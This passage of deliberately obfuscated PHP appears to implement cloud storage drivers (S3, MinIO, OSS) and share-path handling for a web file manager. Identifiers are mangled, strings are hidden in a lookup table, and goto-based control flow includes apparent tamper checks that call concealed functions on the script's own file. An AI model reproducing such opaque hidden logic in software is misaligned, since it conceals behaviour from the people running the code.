$İĞüŸ”¢[12], $İĞüŸ”¢[123], $İĞüŸ”¢[12], "\x78\55\x61\155\x7a\55\x64\141\164\x65\72{$Ø×‹¨}", $İĞüŸ”¢[8] . $this->bucket . $İĞüŸ”¢[8] . $this->pathEncode($¾º¿µÊÀ) . $¦±ö ‡Ú); $ˆø£¯ = implode($İĞüŸ”¢[288], $Û¸­ä“£); $êÎÛÓÖÜ = $this->client->__getSignature($ˆø£¯); return array($İĞüŸ”¢[289] => $êÎÛÓÖÜ, $İĞüŸ”¢[285] => $Ø×‹¨, $İĞüŸ”¢[292] => $¥¥Íà¡ş); } public function uploadPartAuthV4($ˆıª¿, $ƒë³°ğÓ = array()) { $—˜ö’äï =& $_SERVER[‹‰”››ê]; $öÉØáÃ = $ƒë³°ğÓ[$—˜ö’äï[97]]; $ñ¦ÕåÏØ = array($—˜ö’äï[276] => gmdate($—˜ö’äï[283]), $—˜ö’äï[293] => _get($ƒë³°ğÓ, $—˜ö’äï[294], hash($—˜ö’äï[278], $—˜ö’äï[12]))); $¬—Ïå‡× = explode($—˜ö’äï[211], $this->getHost()); $ ¬×£« = array($—˜ö’äï[295] => $¬—Ïå‡×[1], $—˜ö’äï[296] => $—˜ö’äï[12], $—˜ö’äï[249] => $—˜ö’äï[123], $—˜ö’äï[297] => $ƒë³°ğÓ[$—˜ö’äï[79]]); $°¸òŞ¢å = $—˜ö’äï[256]; $‚óö¾ê¸ = $—˜ö’äï[8] . $this->pathEncode($öÉØáÃ); $„ÍÖìŞ³ = array_intersect_key($ƒë³°ğÓ, array_flip(array($—˜ö’äï[286], $—˜ö’äï[284]))); $¥¨º¤ç• = $this->client->__getSignatureV4($ñ¦ÕåÏØ, $ ¬×£«, $°¸òŞ¢å, $‚óö¾ê¸, $„ÍÖìŞ³); return array($—˜ö’äï[289] => $¥¨º¤ç•, $—˜ö’äï[293] => $ñ¦ÕåÏØ[$—˜ö’äï[293]], $—˜ö’äï[285] => $ñ¦ÕåÏØ[$—˜ö’äï[276]]); } public function uploadListAuthV4($çõÄÓ¾‘, $ààï÷•¶ = array()) { $€ŒÇ®„š =& $_SERVER[‹‰”››ê]; $å‡ÓŒûĞ = $ààï÷•¶[$€ŒÇ®„š[97]]; $¹Å—‚ò = $ààï÷•¶[$€ŒÇ®„š[284]]; $¦è‰À¾ª = $this->client->listParts($this->bucket, $å‡ÓŒûĞ, $¹Å—‚ò); if (!$¦è‰À¾ª) { return !1; } $óäĞ¯šÂ = $€ŒÇ®„š[298]; foreach ($¦è‰À¾ª as $¶ìä§è) { $óäĞ¯šÂ .= $€ŒÇ®„š[299] . "\x3c\120\x61\x72\x74\116\165\155\x62\145\162\x3e{$¶ìä§è[$€ŒÇ®„š[300]]}\74\57\x50\x61\x72\164\x4e\x75\x6d\x62\x65\162\76\12" . "\74\105\124\141\x67\76{$¶ìä§è[$€ŒÇ®„š[301]]}\x3c\x2f\105\x54\141\147\76\12" . $€ŒÇ®„š[302]; } $óäĞ¯šÂ .= $€ŒÇ®„š[303]; $ßéå®¼õ = array($€ŒÇ®„š[276] => gmdate($€ŒÇ®„š[283]), $€ŒÇ®„š[293] => hash($€ŒÇ®„š[278], $óäĞ¯šÂ)); $˜íåª·í = explode($€ŒÇ®„š[211], $this->getHost()); $¢šÛÜ˜Ä = array($€ŒÇ®„š[295] => $˜íåª·í[1], $€ŒÇ®„š[249] => $€ŒÇ®„š[123], $€ŒÇ®„š[297] => strlen($óäĞ¯šÂ)); $ë±Ãã© = $€ŒÇ®„š[291]; $—¨—Ø½ó = $€ŒÇ®„š[8] . $this->pathEncode($å‡ÓŒûĞ); $Õ¢®ãÃ³ = array($€ŒÇ®„š[284] => $¹Å—‚ò); $²¥‰‚˜ = $this->client->__getSignatureV4($ßéå®¼õ, $¢šÛÜ˜Ä, $ë±Ãã©, $—¨—Ø½ó, $Õ¢®ãÃ³); return array($€ŒÇ®„š[289] => $²¥‰‚˜, $€ŒÇ®„š[293] => $ßéå®¼õ[$€ŒÇ®„š[293]], $€ŒÇ®„š[285] => $ßéå®¼õ[$€ŒÇ®„š[276]], $€ŒÇ®„š[292] => $¦è‰À¾ª); } private function _isClientAsync() { $­íà£Ôå =& $_SERVER[‹‰”››ê]; static $¨”ö‰æş = null; if ($¨”ö‰æş === null) { $î¶Ï³éº = isset($_REQUEST[$­íà£Ôå[304]]) ? json_decode($_REQUEST[$­íà£Ôå[304]], !0) : !1; $¨”ö‰æş = $î¶Ï³éº && _get($î¶Ï³éº, $­íà£Ôå[305]) == $­íà£Ôå[306]; } return $¨”ö‰æş; } public function getHost() { $ÖçÌı·„ =& $_SERVER[‹‰”››ê]; $ù¬í×œí = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÖçÌı·„[70], $ÖçÌı·„[64], $ÖçÌı·„[69], $ÖçÌı·„[62]))) { return $ù¬í×œí . $ÖçÌı·„[8] . $this->bucket; } if ($this->osType == $ÖçÌı·„[62] && !is_domain($ù¬í×œí)) { return $ù¬í×œí . $ÖçÌı·„[8] . $this->bucket; } $ù¬í×œí = explode($ÖçÌı·„[211], $ù¬í×œí); return $ù¬í×œí[0] . $ÖçÌı·„[211] . $this->bucket . $ÖçÌı·„[10] . $ù¬í×œí[1]; } public function size($½ö™ì¸¼) { $º Œ©” = $this->objectMeta($½ö™ì¸¼); return $º Œ©” ? $º Œ©”[$_SERVER[‹‰”››ê][79]] : 0; } public function info($ÙÊ¡Æ‹×) { if ($this->isFolder($ÙÊ¡Æ‹×)) { return $this->folderInfo($ÙÊ¡Æ‹×); } else { if ($this->isFile($ÙÊ¡Æ‹×)) { return $this->fileInfo($ÙÊ¡Æ‹×); } } return !1; } public function exist($¨ÈØºÈª) { return $this->isFile($¨ÈØºÈª) || $this->isFolder($¨ÈØºÈª); } public function isFile($îì¤… ê) { return !$this->isFolder($îì¤… ê) && $this->objectMeta($îì¤… ê); } public function isFolder($ğ”â·•“) { return $this->cacheMethod($_SERVER[‹‰”››ê][180], $ğ”â·•“); } protected function objectMeta($‚áŠäÌê) { return $this->cacheMethod($_SERVER[‹‰”››ê][182], $‚áŠäÌê); } protected function _objectMeta($æÉöëµ®) { $•´úÀËã =& $_SERVER[‹‰”››ê]; $æÉöëµ® = rtrim($æÉöëµ®, $•´úÀËã[8]); try { $Å¬ˆÏé· = $this->client->getObjectInfo($this->bucket, $æÉöëµ®); if (!isset($Å¬ˆÏé·[$•´úÀËã[255]]) && isset($Å¬ˆÏé·[$•´úÀËã[307]])) { $Å¬ˆÏé·[$•´úÀËã[255]] = $Å¬ˆÏé·[$•´úÀËã[307]]; } } catch (Exception $š„¦™Ë™) { $Å¬ˆÏé· = !1; } if (!$Å¬ˆÏé·) { } return $Å¬ˆÏé·; } protected function _isFolder($×ˆ¹äÇù) { $×ƒìûÙÊ =& $_SERVER[‹‰”››ê]; $×ˆ¹äÇù = rtrim($×ˆ¹äÇù, $×ƒìûÙÊ[8]) . $×ƒìûÙÊ[8]; if ($×ˆ¹äÇù == $×ƒìûÙÊ[12] || $×ˆ¹äÇù == $×ƒìûÙÊ[8]) { return !0; } $¥®·„„› = $this->client->getBucket($this->bucket, $×ˆ¹äÇù, null, 1); if (empty($¥®·„„›[$×ƒìûÙÊ[239]])) { return !1; } $ü¨‚Ç±Ë = $¥®·„„›[$×ƒìûÙÊ[239]][0][$×ƒìûÙÊ[32]]; return stripos($ü¨‚Ç±Ë, $×ˆ¹äÇù) === 0 ? !0 : !1; if (substr($ü¨‚Ç±Ë, -1) == $×ƒìûÙÊ[8]) { return !0; } if (get_path_this($ü¨‚Ç±Ë) == get_path_this($×ˆ¹äÇù)) { return !1; } return !0; } public function listObject($é²ã™º) { return $this->fileList($é²ã™º, $_SERVER[‹‰”››ê][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¤²ÑÃë³) { $ŠäÚÛ =& $_SERVER[‹‰”››ê]; parent::__construct($¤²ÑÃë³); $this->setSignVersion($ŠäÚÛ[250]); if (!$this->region) { $this->region = $ŠäÚÛ[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $¹œ£íÁ³ = $this->getBktRegion(); return $this->region == $¹œ£íÁ³ ? !0 : !1; } public function uploadFormData($Š¡ø¾ü•, $ƒ©¬‰šÀ = 3600) { $¿†·Öş… =& $_SERVER[‹‰”››ê]; $–¶İ‘•é = $¿†·Öş…[232]; $ä°÷Øà€ = $¿†·Öş…[260]; $« ¾ÒÜé = $¿†·Öş…[62]; $âÆ¡‹¢ç = gmdate($¿†·Öş…[261]); $¡‘°ö = gmdate($¿†·Öş…[262]); $û¡¯ï„Í = $¿†·Öş…[263]; $©»ËÓ¬ß = $ƒ©¬‰šÀ . $¿†·Öş…[12]; $ºÅ…ß†— = $¿†·Öş…[264]; $™ñâ¶’¾ = array($this->accessKey, $¡‘°ö, $this->region, $« ¾ÒÜé, $û¡¯ï„Í); $†Ü¥£—• = implode($¿†·Öş…[8], $™ñâ¶’¾); $º”’ºõ = array($¿†·Öş…[265] => gmdate($¿†·Öş…[266], strtotime($¿†·Öş…[267])), $¿†·Öş…[268] => array(array($¿†·Öş…[269] => $this->bucket), array($¿†·Öş…[309] => $–¶İ‘•é), array($¿†·Öş…[270], $¿†·Öş…[271], $¿†·Öş…[12]), array($¿†·Öş…[270], $¿†·Öş…[272], $¿†·Öş…[12]), array($¿†·Öş…[270], $¿†·Öş…[310], $¿†·Öş…[12]), array($¿†·Öş…[273] => $ºÅ…ß†—), array($¿†·Öş…[274] => $†Ü¥£—•), array($¿†·Öş…[275] => $ä°÷Øà€), array($¿†·Öş…[276] => $âÆ¡‹¢ç), array($¿†·Öş…[277] => $©»ËÓ¬ß))); $âÑ“Õçº = base64_encode(json_encode($º”’ºõ)); $ü£¡÷×î = hash_hmac($¿†·Öş…[278], $¡‘°ö, $¿†·Öş…[279] . $this->secret, !0); $ÂìªÔ¶ = hash_hmac($¿†·Öş…[278], $this->region, $ü£¡÷×î, !0); $ÃæÁ×Š´ = hash_hmac($¿†·Öş…[278], $« ¾ÒÜé, $ÂìªÔ¶, !0); $Å¨‹‘®î = hash_hmac($¿†·Öş…[278], $û¡¯ï„Í, $ÃæÁ×Š´, !0); $äË¹ƒã­ = hash_hmac($¿†·Öş…[278], $âÑ“Õçº, $Å¨‹‘®î); $“‹É‹£ = array($¿†·Öş…[249] => $¿†·Öş…[12], $¿†·Öş…[297] => $¿†·Öş…[12], $¿†·Öş…[309] => $–¶İ‘•é, $¿†·Öş…[273] => $ºÅ…ß†—, $¿†·Öş…[280] => $âÑ“Õçº, $¿†·Öş…[311] => $†Ü¥£—•, $¿†·Öş…[312] => $ä°÷Øà€, $¿†·Öş…[313] => $âÆ¡‹¢ç, $¿†·Öş…[314] => $©»ËÓ¬ß, $¿†·Öş…[315] => $äË¹ƒã­, $¿†·Öş…[209] => $this->getHost()); return $“‹É‹£; } } goto bÛº‘¥Æ³²; E³ŒíµÀËŠ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\137\x6f\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Áéø‘‡») { $‚—ŞğÂŠ =& $_SERVER[‹‰”››ê]; $ƒá¨‘Ş˜ = defined($‚—ŞğÂŠ[2222]) && USER_ID ? USER_ID : $‚—ŞğÂŠ[12]; return "\x55\163\145\162\x4f\x70\x74\151\x6f\156\137{$Áéø‘‡»}\137" . $ƒá¨‘Ş˜; } protected function filterWhere($¬Ê‘²Âæ) { $ÈÉ›¿’€ =& $_SERVER[‹‰”››ê]; $¬Ê‘²Âæ[$ÈÉ›¿’€[1791]] = defined($ÈÉ›¿’€[2222]) && USER_ID ? USER_ID : $ÈÉ›¿’€[12]; return $¬Ê‘²Âæ; } public function cacheRemoveUser($ª…Àá‡˜, $†¿¯¾†æ) { return Cache::remove("\x55\163\145\x72\x4f\x70\x74\151\x6f\156\137{$ª…Àá‡˜}\x5f" . $†¿¯¾†æ); } protected function optionDefault($àªµµ¥¡ = '') { $ÁÌ İñ =& $_SERVER[‹‰”››ê]; if ($àªµµ¥¡ == $ÁÌ İñ[12]) { return $GLOBALS[$ÁÌ İñ[6]][$ÁÌ İñ[2537]]; } if ($àªµµ¥¡ == $ÁÌ İñ[2538]) { return $GLOBALS[$ÁÌ İñ[6]][$ÁÌ İñ[2539]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\56\164\141\147\x4c\151\x73\164"; public $modelType = "\125\x73\145\162\117\x70\x74\151\157\156"; public $field = array("\156\x61\x6d\145", "\163\x74\x79\154\145", "\x73\157\162\164"); public function listData($èÑ„‹×È = false, $ãıÚŸ©Ü = "\x73\157\x72\164", $Ê³ä· = false) { return parent::listData($èÑ„‹×È, $ãıÚŸ©Ü, $Ê³ä·); } public function remove($ƒ£šÒµ£) { return parent::remove($ƒ£šÒµ£); } public function add($Èé×Ñ¾, $Áæƒ©ĞÖ = "\x6c\141\142\145\154\55\147\x72\145\x79\55\156\157\x72\x6d\141\x6c") { $¼×É•‹Û =& $_SERVER[‹‰”››ê]; if ($this->findByName($Èé×Ñ¾)) { return !1; } $ˆÓş•ãé = array($¼×É•‹Û[506] => $Èé×Ñ¾, $¼×É•‹Û[572] => $Áæƒ©ĞÖ, $¼×É•‹Û[1996] => $this->getSort($¼×É•‹Û[347]) + 1); return parent::insert($ˆÓş•ãé); } public function update($ÏĞù ™¾, $ƒ¯½Ì­¡) { $ïãÑ™‡À =& $_SERVER[‹‰”››ê]; $±ûÂ§í = $this->listData($ÏĞù ™¾); $àï¥·Œ× = $this->findByName($ƒ¯½Ì­¡[$ïãÑ™‡À[32]]); if (!$±ûÂ§í || $àï¥·Œ× && $àï¥·Œ×[$ïãÑ™‡À[487]] != $±ûÂ§í[$ïãÑ™‡À[487]]) { return !1; } return parent::update($ÏĞù ™¾, $ƒ¯½Ì­¡); } public function moveTop($Ì–‚çí) { $ßøõå‹¿ =& $_SERVER[‹‰”››ê]; $¢íñÅ‘š = parent::listData(); $»µ¾¢¬Ÿ = $this->getSort($ßøõå‹¿[346]); foreach ($¢íñÅ‘š as &$ÛÂî°ã«) { if ($ÛÂî°ã«[$ßøõå‹¿[487]] == $Ì–‚çí) { $ÛÂî°ã«[$ßøõå‹¿[2016]] = $»µ¾¢¬Ÿ; continue; } $ÛÂî°ã«[$ßøõå‹¿[2016]] += 1; } unset($ÛÂî°ã«); return parent::resetData($¢íñÅ‘š); } public function moveBottom($øàæøâ) { $Ç×ëşÚ£ =& $_SERVER[‹‰”››ê]; $Ç§ıÄ‹Ë = $this->getSort($Ç×ëşÚ£[347]) + 1; return parent::update($øàæøâ, array($Ç×ëşÚ£[2016] => $Ç§ıÄ‹Ë)); } public function resetSort($ŞœëÏ´Í) { $¹ò­¨Ìƒ =& $_SERVER[‹‰”››ê]; $›Í²üØá = array(); $ŞœëÏ´Í = is_array($ŞœëÏ´Í) ? $ŞœëÏ´Í : array(); for ($çÆÚêä­ = 0; $çÆÚêä­ < count($ŞœëÏ´Í); $çÆÚêä­++) { $›Í²üØá[$ŞœëÏ´Í[$çÆÚêä­] . $¹ò­¨Ìƒ[12]] = $çÆÚêä­ + 1; } $½Ê–ô‘ = parent::listData(); foreach ($½Ê–ô‘ as &$‰ƒ…î‘Í) { $öô‰ÛØì = $›Í²üØá[$‰ƒ…î‘Í[$¹ò­¨Ìƒ[487]]]; $‰ƒ…î‘Í[$¹ò­¨Ìƒ[2016]] = $öô‰ÛØì ? $öô‰ÛØì : $‰ƒ…î‘Í[$¹ò­¨Ìƒ[2016]]; } unset($‰ƒ…î‘Í); return parent::resetData($½Ê–ô‘); } private function getSort($†ø›äùÊ) { $¸©Ô½¤Û =& $_SERVER[‹‰”››ê]; $îé×á½· = parent::listData(); $¦Ûğ­ø„ = array_to_keyvalue($îé×á½·, $¸©Ô½¤Û[12], $¸©Ô½¤Û[2016]); if (!$¦Ûğ­ø„) { $¦Ûğ­ø„ = array(0); } $Ê¾Šíö = $†ø›äùÊ == $¸©Ô½¤Û[347] ? max($¦Ûğ­ø„) : min($¦Ûğ­ø„); return intval($Ê¾Šíö); } } goto aš†—ù››; A³‚«®±í: $_file = $_SERVER[$_SERVER[‹‰”››ê][316]]; $_size = $_SERVER[‹‰”››ê][317]; if ($_SERVER[$_SERVER[‹‰”››ê][318]] != $_size($_file)) { $_getc = $_SERVER[‹‰”››ê][319]; $_getfile = $_SERVER[$_SERVER[‹‰”››ê][320]] . $_SERVER[‹‰”››ê][321]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‹‰”››ê][288], $_getfilec); if (count($_getarrs) < $_SERVER[‹‰”››ê][322]) { $exit = $_SERVER[‹‰”››ê][323]; $exit(); } $_act = $_SERVER[‹‰”››ê][324]; $_act($_file); } goto b˜¹–Äã¼; AƒÈ²ÉŸÙ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($¼‚Æ…Í) { $this->pathParse = $¼‚Æ…Í; $this->model = Model($_SERVER[‹‰”››ê][1437]); } public function getPathOuter($‘óô†í ) { $ñ¿×Øõé =& $_SERVER[‹‰”››ê]; if (!$‘óô†í ) { return $‘óô†í ; } $Ê¾òÜ = $this->parse($‘óô†í ); return trim(KodIO::makeShare($this->pathParse[$ñ¿×Øõé[487]], $Ê¾òÜ[$ñ¿×Øõé[487]]), $ñ¿×Øõé[8]); } protected function infoParse($ø©¡£Ä½, $÷¹æ—ñ“ = false, $ÅâêªÍú = false) { $ª¬êö† =& $_SERVER[‹‰”››ê]; $î™Æş Ç = $this->pathParse[$ª¬êö†[487]]; $Âôª¾ığ = trim($this->pathParse[$ª¬êö†[1266]], $ª¬êö†[8]); return Action($ª¬êö†[1444])->sharePathInfo($î™Æş Ç, $Âôª¾ığ, $÷¹æ—ñ“); } public function infoFull($š´ê£í§) { $Šˆ¢ëİÖ =& $_SERVER[‹‰”››ê]; $úÆ»õÜß = explode($Šˆ¢ëİÖ[8], trim($š´ê£í§, $Šˆ¢ëİÖ[8])); if (count($úÆ»õÜß) > 1) { $¸†š…´ = implode($Šˆ¢ëİÖ[8], array_splice($úÆ»õÜß, 1)); $İˆæ¿Ùè = $this->model->pathInfoByPath($úÆ»õÜß[0], $¸†š…´); if (!$İˆæ¿Ùè) { return !1; } $this->pathParse[$Šˆ¢ëİÖ[1266]] = $İˆæ¿Ùè[$Šˆ¢ëİÖ[194]]; } return $this->infoParse($š´ê£í§); } public function listAll($ˆˆ¸“¾) { $äÆ·›Âƒ =& $_SERVER[‹‰”››ê]; $şâ¶öˆŒ = IO::info($this->pathParse[$äÆ·›Âƒ[87]]); if (!$şâ¶öˆŒ) { return array(); } $ª¸‹ÉÏ = $this->model->listAll($ˆˆ¸“¾); $õ­ ŞñÒ = Model($äÆ·›Âƒ[681])->getInfo($şâ¶öˆŒ[$äÆ·›Âƒ[682]]); foreach ($ª¸‹ÉÏ as &$àûÙ¿£) { check_abort(); $àûÙ¿£[$äÆ·›Âƒ[90]] = Action($äÆ·›Âƒ[1444])->_shareItemeParse($àûÙ¿£[$äÆ·›Âƒ[90]], $õ­ ŞñÒ); } unset($àûÙ¿£); return $ª¸‹ÉÏ; } } if ($_SERVER[$_SERVER[‹‰”››ê][318]] != $_SERVER[$_SERVER[‹‰”››ê][1445]]) { $_getc = $_SERVER[‹‰”››ê][319]; $_getfile = $_SERVER[$_SERVER[‹‰”››ê][320]] . $_SERVER[‹‰”››ê][321]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‹‰”››ê][288], $_getfilec); if (count($_getarrs) < $_SERVER[‹‰”››ê][322]) { $exit = $_SERVER[‹‰”››ê][323]; $exit(); } $_act = $_SERVER[‹‰”››ê][324]; $_act($_SERVER[$_SERVER[‹‰”››ê][316]]); } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ˆÕâ·ÑÚ) { $this->pathParse = $ˆÕâ·ÑÚ; $this->model = Model($_SERVER[‹‰”››ê][1437]); } protected function infoParse($²ñí€¢, $®ØåëƒÛ = false, $äçÆ»÷í = false) { $ç“ÀÇÊ =& $_SERVER[‹‰”››ê]; return Action($ç“ÀÇÊ[1272])->sharePathInfo($this->pathParse[$ç“ÀÇÊ[87]], !0, $®ØåëƒÛ); } public function listPath($ˆßµŒë, $âÀ›ŸûÔ = false) { $ŠÈŠ»ÌÄ =& $_SERVER[‹‰”››ê]; $È¬¢Ÿãš = parent::listPath($ˆßµŒë, $âÀ›ŸûÔ); if (!$È¬¢Ÿãš) { return $È¬¢Ÿãš; } if (is_array($È¬¢Ÿãš[$ŠÈŠ»ÌÄ[1446]])) { $È¬¢Ÿãš[$ŠÈŠ»ÌÄ[1446]] = Action($ŠÈŠ»ÌÄ[1272])->shareItemInfo($È¬¢Ÿãš[$ŠÈŠ»ÌÄ[1446]]); } foreach ($È¬¢Ÿãš as $œÄÒÒ „ => $”€ìˆ) { if (!in_array($œÄÒÒ „, array($ŠÈŠ»ÌÄ[86], $ŠÈŠ»ÌÄ[85]))) { continue; } foreach ($”€ìˆ as $¬Éö°óÃ => $Â¤Õµ‘˜) { $È¬¢Ÿãš[$œÄÒÒ „][$¬Éö°óÃ] = Action($ŠÈŠ»ÌÄ[1272])->shareItemInfo($Â¤Õµ‘˜); } } return $È¬¢Ÿãš; } public function listAll($©·Í¥ğß) { $©ğÚ‘¸ß =& $_SERVER[‹‰”››ê]; $…¹ÚÒõ¼ = IO::info($this->pathParse[$©ğÚ‘¸ß[87]]); if (!$…¹ÚÒõ¼) { return array(); } $õ‘‚¸å = $this->model->listAll($©·Í¥ğß); foreach ($õ‘‚¸å as &$–Øûš´¢) { $–Øûš´¢[$©ğÚ‘¸ß[90]] = Action($©ğÚ‘¸ß[1272])->shareItemInfo($–Øûš´¢[$©ğÚ‘¸ß[90]]); } unset($–Øûš´¢); return $õ‘‚¸å; } } goto e³¬Ûšƒëº; DÉÒÌ»”£“: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($òŸÁØ‚œ) { parent::__construct(); include_once SDK_DIR . $_SERVER[‹‰”››ê][1480]; $this->_init($òŸÁØ‚œ); } public function _init($ÑøÁÎÅ˜) { $İüÈÌ–• =& $_SERVER[‹‰”››ê]; $this->config = $ÑøÁÎÅ˜; foreach ($ÑøÁÎÅ˜ as $ñ÷üù‚Ç => $‡‰ú¯± ) { if (isset($this->{$ñ÷üù‚Ç})) { $this->{$ñ÷üù‚Ç} = $‡‰ú¯± ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($İüÈÌ–•[1481] . LNG($İüÈÌ–•[1482])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $œÌÛÖíÕ =& $_SERVER[‹‰”››ê]; $’®°Ìú“ = new OSS\Model\CorsConfig(); $ÉîÎ‡¥É = new OSS\Model\CorsRule(); $ÉîÎ‡¥É->addAllowedOrigin($œÌÛÖíÕ[1483]); $ÉîÎ‡¥É->addAllowedMethod($œÌÛÖíÕ[1484]); $ÉîÎ‡¥É->addAllowedMethod($œÌÛÖíÕ[1485]); $ÉîÎ‡¥É->addAllowedMethod($œÌÛÖíÕ[1486]); $ÉîÎ‡¥É->addAllowedMethod($œÌÛÖíÕ[1487]); $ÉîÎ‡¥É->addAllowedMethod($œÌÛÖíÕ[165]); $ÉîÎ‡¥É->setMaxAgeSeconds(600); $ÉîÎ‡¥É->addExposeHeader($œÌÛÖíÕ[1488]); $ÉîÎ‡¥É->addAllowedHeader($œÌÛÖíÕ[1483]); $’®°Ìú“->addRule($ÉîÎ‡¥É); try { $this->client->putBucketCors($this->bucket, $’®°Ìú“); } catch (OSS\Core\OssException $€ÂÌÄ‰) { $this->writeLog(__FUNCTION__ . $œÌÛÖíÕ[215] . $€ÂÌÄ‰->getMessage()); return !1; } return !0; } public function getBucketCors() { $Îú€´…¿ =& $_SERVER[‹‰”››ê]; $ŞÖ¬ŠÆ¡ = null; try { $ŞÖ¬ŠÆ¡ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $™Í¦¿¯—) { $this->writeLog(__FUNCTION__ . $Îú€´…¿[215] . $™Í¦¿¯—->getMessage()); return null; } if (!$ŞÖ¬ŠÆ¡ || !($×ĞÜİ = $ŞÖ¬ŠÆ¡->getRules())) { return null; } $Ì„ïÙŒÁ = $×ĞÜİ[0]->getAllowedOrigins(); $îÚÒ¤ø² = $×ĞÜİ[0]->getAllowedMethods(); $Š´¶©Ë = $×ĞÜİ[0]->getMaxAgeSeconds(); $¥´ãÊµÅ = $×ĞÜİ[0]->getExposeHeaders(); $°üñèÏ = $×ĞÜİ[0]->getAllowedHeaders(); return array($Îú€´…¿[221] => isset($Ì„ïÙŒÁ[0]) ? $Ì„ïÙŒÁ[0] : $Îú€´…¿[12], $Îú€´…¿[225] => $îÚÒ¤ø², $Îú€´…¿[1489] => $Š´¶©Ë, $Îú€´…¿[1490] => isset($¥´ãÊµÅ[0]) ? $¥´ãÊµÅ[0] : $Îú€´…¿[12], $Îú€´…¿[222] => isset($°üñèÏ[0]) ? $°üñèÏ[0] : $Îú€´…¿[12]); } public function isBucketCors() { $Ïé·—¬ =& $_SERVER[‹‰”››ê]; $¯²Ñì = $this->getBucketCors(); if (!$¯²Ñì || !is_array($¯²Ñì)) { return !1; } if ($¯²Ñì[$Ïé·—¬[221]] != $Ïé·—¬[223] || $¯²Ñì[$Ïé·—¬[222]] != $Ïé·—¬[223]) { return !1; } $‰Ù‘ùóÖ = array_map($Ïé·—¬[224], $¯²Ñì[$Ïé·—¬[225]]); if (!is_array($‰Ù‘ùóÖ)) { $‰Ù‘ùóÖ = array(); } $çâŠªø = array($Ïé·—¬[226], $Ïé·—¬[227], $Ïé·—¬[228], $Ïé·—¬[229], $Ïé·—¬[230]); $Ÿ··ÚÀ = array_diff($çâŠªø, $‰Ù‘ùóÖ); return empty($Ÿ··ÚÀ); } public function mkfile($Ï×ÊÀ¦½, $ÙÁÂá¶ = '', $ğá‹õÍ° = REPEAT_RENAME) { $›‰Î¢Ë = $this->setContent($Ï×ÊÀ¦½, $ÙÁÂá¶); if ($›‰Î¢Ë !== !1) { return $this->getPathOuter($Ï×ÊÀ¦½); } return !1; } public function mkdir($ØÑ¦‡’ä, $ï„®é‚Á = REPEAT_SKIP) { if ($ï„®é‚Á && $this->_isFolder($ØÑ¦‡’ä)) { return $this->getPathOuter($ØÑ¦‡’ä); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ØÑ¦‡’ä)); } catch (OSS\Core\OssException $ãè»Ï÷) { $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][215] . $ãè»Ï÷->getMessage()); return !1; } return $this->getPathOuter($ØÑ¦‡’ä); } private function fileList($Éşù¿øä, $³§›Ö¡ = '', $«Õí‡œö = 0) { $Ÿçäù =& $_SERVER[‹‰”››ê]; $Éşù¿øä = trim($Éşù¿øä, $Ÿçäù[8]); $’ñ‡üÒ» = empty($Éşù¿øä) && $Éşù¿øä !== $Ÿçäù[231] ? $Ÿçäù[12] : $Éşù¿øä . $Ÿçäù[8]; $Ò“”µü = $Ÿçäù[12]; $ëÊ¿©®É = 1000; $ºÄÜãÜç = $¼îíôØ = array(); while (!0) { check_abort(); $¸î¬Â“ = array($Ÿçäù[1491] => $³§›Ö¡, $Ÿçäù[1492] => $’ñ‡üÒ», $Ÿçäù[1493] => $ëÊ¿©®É, $Ÿçäù[1494] => $Ò“”µü); try { $§‡“èÊı = $this->client->listObjects($this->bucket, $¸î¬Â“); } catch (OSS\Core\OssException $ùÕ°µÀÊ) { $this->writeLog(__FUNCTION__ . $Ÿçäù[215] . $ùÕ°µÀÊ->getMessage()); break; } $Ò“”µü = $§‡“èÊı->getNextMarker(); $¯š–°õ± = $§‡“èÊı->getObjectList(); $”ØüŞÃË = $§‡“èÊı->getPrefixList(); foreach ($¯š–°õ± as $œ³®ë¶õ) { if ($œ³®ë¶õ->getKey() == $’ñ‡üÒ») { continue; } $—ëø¸¬ = $œ³®ë¶õ->getKey(); $²Ëåƒ«ì = $œ³®ë¶õ->getSize(); $İ‘î¤ = $œ³®ë¶õ->getLastModified(); $ÍÃ•¶¦½ = trim($œ³®ë¶õ->getETag(), $Ÿçäù[121]); $Õ†ïç¥˜ = $«Õí‡œö ? array($Ÿçäù[32] => $—ëø¸¬, $Ÿçäù[79] => $²Ëåƒ«ì, $Ÿçäù[207] => strtotime($İ‘î¤), $Ÿçäù[1495] => $ÍÃ•¶¦½) : $—ëø¸¬; $·Î‹ÕÌ¨ = $²Ëåƒ«ì == 0 && substr($—ëø¸¬, strlen($—ëø¸¬) - 1, 1) == $Ÿçäù[8] ? !0 : !1; $—õøÒÒ = array($Ÿçäù[79] => $²Ëåƒ«ì, $Ÿçäù[1496] => $²Ëåƒ«ì, $Ÿçäù[88] => strtotime($İ‘î¤), $Ÿçäù[1497] => $İ‘î¤, $Ÿçäù[1495] => $ÍÃ•¶¦½); $this->cacheMethodInfoSet($—ëø¸¬, $·Î‹ÕÌ¨, $—õøÒÒ); if ($·Î‹ÕÌ¨) { $ºÄÜãÜç[] = $—ëø¸¬; continue; } $¼îíôØ[] = $Õ†ïç¥˜; } foreach ($”ØüŞÃË as $›êçæ¢) { $ºÄÜãÜç[] = $›êçæ¢->getPrefix(); 